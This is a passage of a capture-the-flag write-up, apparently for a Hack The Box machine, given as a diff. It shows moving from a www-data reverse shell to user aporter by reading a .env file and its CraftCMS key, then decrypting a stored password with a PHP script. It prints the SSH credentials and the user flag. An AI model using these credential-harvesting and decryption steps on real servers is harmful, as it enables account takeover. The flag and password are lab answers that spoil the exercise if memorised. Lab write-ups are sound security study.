@@ -88,7 +88,54 @@ yii2 can create objects that can directly be configured to execute the shell com
 
 https://github.com/khush-613/CVE-2026-44011-poc/tree/main
 
-
 gives reverse shell. gives **```www-data```**.
+
+### User - aporter
+
+```
+/var/www/portal/.env
+```
+
+```
+.env files :: a simple text file used to store sensitive data and configuration settings separate from your application's source code.
+```
+
+<img width="1003" height="553" alt="Screenshot 2026-10-03 at 00 04 23" src="https://github.com/user-attachments/assets/c7d012c7-5b4b-4b1b-a717-09ba2dc48d79" />
+
+the env contains the password and DB name and also mainly craftcms key(key used by craft cms platform to encrypt sensitive passwords).
+
+in the ```htbairways_settings``` table reveals the encrypted password of **aporter** user.
+
+<img width="1470" height="408" alt="Screenshot 2026-10-03 at 00 05 49" src="https://github.com/user-attachments/assets/1e180663-2cc7-4380-8707-fc86c0a3e847" />
+
+**script for decryption ::**
+```
+cat > /tmp/decrypt2.php << 'EOF'
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+require "/var/www/portal/vendor/autoload.php";
+
+$enc = trim(file_get_contents("/tmp/enc.txt"));
+$key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr";
+
+$security = new \yii\base\Security();
+$result = $security->decryptByKey(base64_decode($enc), $key);
+
+var_dump($result);
+EOF
+php /tmp/decrypt2.php
+```
+**SSH credentials ::**
+```
+Username :: aporter
+Password :: "SkypOrt_Relay!26"
+```
+## User flag ::
+```
+213b869b0920cc8e70e0f2b9ce83adf7
+```
+
+
 
 
